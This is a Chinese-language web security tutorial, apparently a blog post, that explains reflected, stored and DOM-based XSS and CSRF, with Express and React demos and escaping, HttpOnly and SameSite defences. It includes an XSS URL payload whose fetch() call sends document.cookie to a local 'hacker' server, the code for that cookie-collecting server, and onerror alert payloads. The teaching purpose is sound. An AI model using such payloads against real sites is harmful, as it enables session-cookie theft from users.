### 1 XSS
* XSS全称叫跨站脚本攻击（Cross Site Scripting），目的是把script脚本注入到网页中在浏览器执行该脚本
#### 1.1 反射型
* 用express写个简单的api
```js
const express = require("express");
const app = express();
app.get("/article", function (req, res) {
  const { type } = req.query;
  res.send(`您查询的文章类型是:${type}`);//根据url中的type参数返回
});
app.listen(4000, () => {
  console.log("listening http://localhost:4000");
});
```
* 正常情况是这样的，在URL中传递查询参数type，后台处理后返回结果

![image.png](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/4638eb9c24cd466ea53bdbdb6ae58d9a~tplv-k3u1fbpfcp-watermark.image?)
* 但是如果在URL传入script脚本

![image.png](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/5be1ef5ed3724fbe9be1167003dc7b0e~tplv-k3u1fbpfcp-watermark.image?)
* 这时候后台把结果返回到浏览器时会执行这个脚本,这就成功注入了script脚本，完成了一次反射型XSS攻击

![image.png](https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/fb8f641dad314a1ab6d8365dad61e6e4~tplv-k3u1fbpfcp-watermark.image?)
![image.png](https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/166ac6ac291b461092927c948e9b2990~tplv-k3u1fbpfcp-watermark.image?)

* 能成功执行注入的script脚本那就可以干很多事了，比如下面这个链接，他会获取当前点击用户的cookie然后发送到黑客的服务器上
```
http://localhost:4000/article?type=%3Cscript%3Efetch(`http://localhost:4001/cookie?cookie=${document.cookie}`)%3C/script%3E
```
```js
const express = require("express");
const app = express();
const app2 = express();
app.get("/article", function (req, res) {
  const { type } = req.query;
  res.send(`您查询的文章类型是:${type}`);
});
app.listen(4000, () => {
  console.log("listening http://localhost:4000");
});
app2.get("/cookie", function (req, res) {
  const { cookie } = req.query;
  console.log(`盗取的cookie:${cookie}`);
  res.send();
});
app2.listen(4001, () => {
  console.log("黑客网站盗取cookie listening http://localhost:4001");
});
```

![image.png](https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/59a7eeefffcb48e599473041f439eb98~tplv-k3u1fbpfcp-watermark.image?)

* 刷新URL发现服务器已经成功盗取了cookie,所以cookie要加上HttpOnly这样js就无法操作cookie了

![image.png](https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/2d20afef87af48069ec8f49322321260~tplv-k3u1fbpfcp-watermark.image?)

* 防御措施:后台把特殊符号转义再返回到前端
```js
const express = require("express");
const app = express();
app.get("/article", function (req, res) {
  const { type } = req.query;
  res.send(`您查询的文章类型是:${encodeHTML(type)}`);
});
app.listen(4000, () => {
  console.log("listening http://localhost:4000");
});
function encodeHTML(str) {
  return str
    .replace(/&/g, "&amp;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&apos;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}
```

![image.png](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/f9fa9b1b676e425483523cd4659647b1~tplv-k3u1fbpfcp-watermark.image?)

#### 1.2 存储型
* 存储型和反射型的区别在于script脚本是否持久化保存到后台数据库，上面的反射型受害者只有点击那个带有恶意脚本链接的用户，但是存储型的因为恶意脚本被持久化保存到了数据库中，所以受害者将会是所有访问这个网站的用户;
* 比如掘金网的评论区，我输入下面这段文字

![image.png](https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/ad55a1651cee476ab9fb1bc6482f3465~tplv-k3u1fbpfcp-watermark.image?)

* 保存后掘金是会把这段文字保存到数据库中的，后面其他网友点击这篇文章的时候加载这些内容的时候，如果掘金网没有做防御的话那就是会执行这个脚本弹出alert，显然掘金后台应该是有做转义的，而且掘金页面是用Vue写的，Vue和React这些框架也都帮我们做了转义(v-html和dangerouslySetInnerHTML除外)

![image.png](https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/88d1113e161a473c844e3bab3176a458~tplv-k3u1fbpfcp-watermark.image?)


* 防御措施:
  * 前端提交前进行校验过滤，如果包含恶意脚本则不提交，或者提交转义后的字符串 
  * 后端接收后先校验过滤，如果包含恶意脚本则不存储到数据库，或者存储转义后的字符串
  * 前端渲染时候进行过滤，输出转义后的字符串

#### 1.3 DOM型
* 与上面两者不同，DOM型XSS不会和后台服务器产生任何关系，完全是前端的问题，是在页面DOM更新时把恶意脚本动态插入到HTML中执行了
* 下面这段代码直接把input输入的内容用innerHTML插入到span中去了
```html
<!DOCTYPE html>
<html lang="zh_CN">
<head>
    <meta charset="utf-8" />
    <link rel="icon" href="%PUBLIC_URL%/favicon.ico" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>原始HTML</title>
</head>
<body>
    <input id="input" type="text" placeholder="请输入" style="width:300px" />
    <button onclick="container.innerHTML = input.value">提交</button>
    <div>
        你输入的是:<span id="container"></span>
    </div>
</body>
</html>
```

![image.png](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/312918cea83f4248b447b1fe310fdc18~tplv-k3u1fbpfcp-watermark.image?)

* 但是如果我们插入的是恶意脚本内容,那就直接执行了这个恶意脚本
```
<img src="wrongUrl" onerror ="alert('XSS攻击')"> 
```
![image.png](https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/70903e6b48de4af9a1bf35a0201f6309~tplv-k3u1fbpfcp-watermark.image?)

* 注意简单的script标签在浏览器中是不会被执行的,因为[HTML5](https://developer.mozilla.org/zh-CN/docs/Web/API/Element/innerHTML)中指定不执行由 `innerHTML` 插入的script标签

![image.png](https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/53838df5bfab4c08923b409a71f3262b~tplv-k3u1fbpfcp-watermark.image?)

![image.png](https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/7f2fea6dc2ff4924aea45bcad603aa28~tplv-k3u1fbpfcp-watermark.image?)

* React的dangerouslySetInnerHTML测试
```js
import React from "react";
import ReactDOM from "react-dom/client";
const htmlText = `
<span>test DOM XSS</span>
<script>alert('script')</script>
<img src="wrongUrl" onerror ="alert('DOM型XSS攻击')">
`;
function App() {
  return (
    <div>
      {htmlText}
      <p
        dangerouslySetInnerHTML={{
          __html: htmlText,
        }}
      ></p>
    </div>
  );
}
const root = ReactDOM.createRoot(document.getElementById("root"));
root.render(<App />);
```
* 上面代码会alert，因为dangerouslySetInnerHTML背后React是调用innerHTML把htmlText这段内容插入到了p元素中，然后执行了恶意脚本`alert('DOM型XSS攻击')`

![image.png](https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/c3c121881ad04a8ab0d57c2db53efe79~tplv-k3u1fbpfcp-watermark.image?)

* 可以看到页面div元素中渲染了htmlText的文字内容，因为react-dom在渲染前帮我们做了转义，在react-dom的源码中有个escapeHtml方法会把`" ' & < >`这5个字符在渲染到浏览器前进行转义

![image.png](https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/d06ce7f212ac461180f190ff66ca931a~tplv-k3u1fbpfcp-watermark.image?)

```
<img src="wrongUrl" onerror ="alert('DOM型XSS攻击')"> 
// 转义后
&lt;img src=&quot;wrongUrl&quot; onerror =&quot;alert(&#x27;DOM型XSS攻击&#x27;)&quot;&gt; 
```

* 但是用dangerouslySetInnerHTML插入到p元素中的内容是没有经过转义的，所以会插入恶意脚本并执行

![image.png](https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/a204aff02cad4940bf5abce6d6278a88~tplv-k3u1fbpfcp-watermark.image?)

* 防御措施:
  * 在使用innerHTML或者v-html,dangerouslySetInnerHTML等时先把特殊字符转义

```js
import React from "react";
import ReactDOM from "react-dom/client";
const htmlText = `
<span>test DOM XSS</span>
<script>alert('script')</script>
<img src="wrongUrl" onerror ="alert('DOM型XSS攻击')">
`;
function App() {
  return (
    <div>
      {htmlText}
      <p
        dangerouslySetInnerHTML={{
          __html: encodeHTML(htmlText),
        }}
      ></p>
    </div>
  );
}
const root = ReactDOM.createRoot(document.getElementById("root"));
root.render(<App />);

function encodeHTML(str) {
  return str
    .replace(/&/g, "&amp;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&apos;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}
```

![image.png](https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/c532dd40c95045128032ae074f04bf73~tplv-k3u1fbpfcp-watermark.image?)

### 2 CSRF
* CSRF全称叫跨站请求伪造（Cross Site Request Forgery），目的是冒充用户做其他操作;
* 比如我登录了掘金网，然后不小心点击了黑客的恶意链接，这个恶意链接里面的代码冒充我向掘金网提交了一条评论，因为请求会自动携带上cookie，所以可以在我毫不知情的情况下带着我登录后的 cookie通过掘金网的认证完成各种操作;
* 防御措施:
  * 设置SameSite属性
    * Strict:跨站点不携带Cookie
    * Lax:大多数情况不携带Cookie，但是导航到目标网址的Get请求除外
    * None
  * 同源检测:后端验证Origin和Referer
  * 添加Token验证
 